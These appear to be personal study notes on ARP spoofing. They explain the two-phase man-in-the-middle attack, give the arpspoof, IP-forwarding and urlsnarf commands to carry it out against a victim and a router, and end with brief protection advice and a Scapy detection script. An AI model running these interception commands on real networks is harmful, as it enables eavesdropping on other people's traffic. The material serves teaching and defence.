
Packets have a source media access control (MAC)
address that represents the machine sending the packet and a source (IP address) that represents where the packet came from.

The internet uses devices called routers to sort and forward packets.

MAC addresses are normally 48-bit numbers written in hexadecimal (for example, `08:00:27:3b:8f:ed`).

An IPv4 address encodes the network hierarchy information in a 32-bit number.
This number is typically represented in four sections separated by dots (such as `192.168.3.1`). 
Each section represents an 8-bit binary number.



## ARP Spoofing Attacks
+ An ARP spoofing attack consists of two phases. 
+ During the first phase:
	+ The attacker sends a fake ARP response to the victim, stating that the attacker’s MAC address maps to the router’s IP address.
	+ This allows the attacker to trick the victim into believing that the attacker’s machine is the router.
+ During the second phase:
	+ The victim accepts the fake ARP packet sent by the attacker and updates the mapping in its ARP table to reflect that the attacker’s MAC address now maps to the router’s IP address. 
	+ This means that the victim’s internet traffic will be sent to the attacker’s machine instead of the router.
	+ The attacker’s machine can then forward this information to the router after inspecting it.


### Intercept the victim's incoming traffic:
+ If the attacker also wants to intercept (اعترض) internet traffic intended for the victim, the attacker must also trick the router into sending it the victim’s traffic. 
+ Therefore, the attacker must create a fake ARP packet indicating that the victim’s IP address maps to the attacker’s MAC address.
+ This allows the attacker to intercept and inspect incoming internet traffic and then forward that traffic to the victim.



## The ARP spoofing attack is an example of a man-in-the-middle attack, because the attacker places themselves between the victim and router.



---
# Performing an ARP Spoofing Attack


## `arpspoof`:
+ The `dsniff` tool contains several useful tools for intercepting network traffic, such as `arpspoof`, a tool that executes an ARP spoofing attack.
```shell
sudo apt install dsniff
```


## `netdiscover`:
+ Run the `netdiscover` tool.
+ The `netdiscover` works by scanning the network using ARP queries. 
+ It issues ARP queries for all possible IP addresses on the sub-network, and when a machine on the network responds, it records and displays the machine’s MAC address and IP address.


## Enable IP forwarding: 
+ Next, you will need to allow the Kali Linux machine to forward packets on behalf of other machines by enabling IP forwarding. 
+ Make sure that you’re a root user on Kali Linux, and then enable IP forwarding by setting the IP forwarding flag:
```python
am@ubuntu:~$ cat /proc/sys/net/ipv4/ip_forward
0

am@ubuntu:~$ sudo echo 1 > /proc/sys/net/ipv4/ip_forward
bash: /proc/sys/net/ipv4/ip_forward: Permission denied

am@ubuntu:~$ sysctl -w net.ipv4.ip_forward=1
sysctl: permission denied on key "net.ipv4.ip_forward", ignoring
net.ipv4.ip_forward = 1

am@ubuntu:~$ sudo sysctl -w net.ipv4.ip_forward=1
[sudo] password for am: 
net.ipv4.ip_forward = 1
```


## Generate ARP replies:
+ You can generate multiple fake ARP replies by running the following command:
```shell
arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>
```
+ The `-t` flag specifies the target, and the `-i` flag represents the interface.
![[Pasted image 20240525160303.png]]
+ Let’s examine the command’s output, paying particular attention to the first line
+ This line represents a summary of the information in the packet that was just sent.
+ The summary is composed of five key parts:
	1. `20:1e:88:b:d4:25` is the MAC address of the machine (attacker), which created the packet.
	2. `9e:fb:c5:e1:76:3b` is the MAC address of the machine (victim) that will receive the packet.
	3. `0806` is a type field indicating that an ARP packet is contained within the Ethernet frame being transmitted.
	4. 42 represents the total number of bytes associated with the Ethernet frame.
	5. The remaining section:
	 + `arp reply 192.168.1.1 is-at 20:1e:88:b:d4:25` is a summary of the ARP reply that falsely states that the router’s IP address (`192.168.1.1`) is associated with the Kali Linux machine’s MAC address (`20:1e:88:b:d4:25`).


## eth0 and wlan:
+ Your NIC supports several ways of connecting to the network. 
+ For example:
	+ `wlan` or `wlo1` represents a wireless LAN (Wi-Fi connection).
	+ `eth0` represents an Ethernet connection.


## Make router think you're the victim:
+ You must also trick the router into believing you’re the victim so that you can intercept incoming internet traffic on the victim’s behalf.
```shell
arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP>
```


## Inspect the packets we’ve intercepted:
+ Inspect the packets we’ve intercepted and extract URLs from them.
+ Extract the URLs by running the following command in a new terminal:
```shell
urlsnarf -i wlo1
```
+ You can run the wire shark for better capturing.

## To Request URL on CLI:
```shell
wget http://www.google.com
```



---
# protecting yourself against arp-spoofing


Any traffic sent over an HTTPS connection is encrypted.

The Electronic Frontier Foundation (eff.org) has created a web browser extension called HTTPS Everywhere that ensures that  ll your web traffic goes over an HTTPS connection.

Installing this plug-in is a great way
to protect yourself.



----
# Detecting an ARP Spoofing Attack



We’ll build our own ARP table using a dictionary and then check to see whether the packet we receive has changed an entry.

`Scapy` is a popular Python package that allows us to read and send packets.



```python
from scapy.all import sniff

ip_mac_map = dict()


def process_packet(packet):
    global ip_mac_map
    src_ip = packet["ARP"].psrc
    src_mac = packet["Ether"].src
    if src_mac in ip_mac_map.keys():
        if ip_mac_map[src_mac] != src_ip:
            try:
                old_ip = ip_mac_map[src_mac]
            except:
                old_ip = "unknown"
            message="Possible ARP attack detected..."
            return message
    else:
        ip_mac_map[src_mac] = src_ip


sniff(
		  count=0, 
		  filter="arp", 
		  store=0, 
		  prn=process_packet
		)

```


### `sniff` function:
+ `count` parameter:
	+ We use the count parameter to indicate the number of packets to sniff.
	+ A count value of 0 means that the library should continuously sniff packets. 
+ `filter` parameter:
	+ We also use the filter parameter, which specifies the type of packet to capture.
	+ Because we’re interested in only ARP packets, we specify a filter value of "arp". 
+ `store` parameter:
	+ The store parameter indicates the number of packets to store. 
	+ We set the parameter to 0 because we don’t want to waste memory by storing packets.
+ `prn` parameter:
	+ Lastly, the `prn` parameter is a functional pointer that points to the function called whenever a packet is received.  
